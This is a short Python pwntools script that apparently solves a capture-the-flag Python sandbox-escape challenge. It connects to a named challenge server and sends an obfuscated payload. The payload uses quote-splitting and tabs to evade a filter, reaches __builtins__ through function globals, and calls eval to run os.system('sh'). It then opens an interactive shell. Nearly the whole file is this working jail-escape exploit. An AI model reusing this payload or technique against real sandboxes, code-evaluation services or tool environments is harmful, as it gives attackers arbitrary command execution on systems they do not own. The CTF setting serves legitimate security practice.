from pwn import remote 
# nc challs3.pyjail.club 9328
r = remote('challs3.pyjail.club', 9328)
inp = ''' [ g:=f\t.__globals__,c:= g ["_"\'_\' \'b\'"u"\t"i"\'l\' \'t\'"i"\'n\'"s"\'_\'"_"],c.eval\t(\t"c"\'.\'"_"\'_\'"i"\t"m"\'p\'"o"\'r\' \'t\'"_"\'_\' \'(\' \'"\'"o"\t"s"\'"\'")"\'.\'"s"\t"y"\t"s"\'t\'"e"\t"m"\'(\' \'"\'"s"\'h\' \'"\'")") ]'''

r.sendline(inp)
r.interactive()